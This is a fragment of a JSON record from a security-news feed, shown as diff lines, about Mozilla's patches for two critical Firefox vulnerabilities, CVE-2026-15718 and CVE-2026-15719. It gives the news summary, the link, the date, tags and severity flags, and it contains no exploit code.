-      "summary": "Mozilla has released updates to address two critical flaws in Firefox for which it warned that exploit code has been published.\n\nThe vulnerabilities are listed below -\n\n\n  CVE-2026-15718, an invalid pointer in the JavaScript: WebAssembly component\n  CVE-2026-15719, a site isolation in the DOM: Navigation component\n\n\"We are aware that exploit code for this is public, however we are not aware of",
-      "link": "https://thehackernews.com/2026/07/firefox-chrome-adobe-and-vmware-updates.html",
-      "published": "2026-07-15T13:18:53+00:00",
-      "source": "The Hacker News Security",
-      "tags": [
-        "news",
-        "zeroday"
-      ],
-      "cve_ids": [
-        "CVE-2026-15718",
-        "CVE-2026-15719"
       ],
       "is_zero_day": false,
       "is_high_severity": true
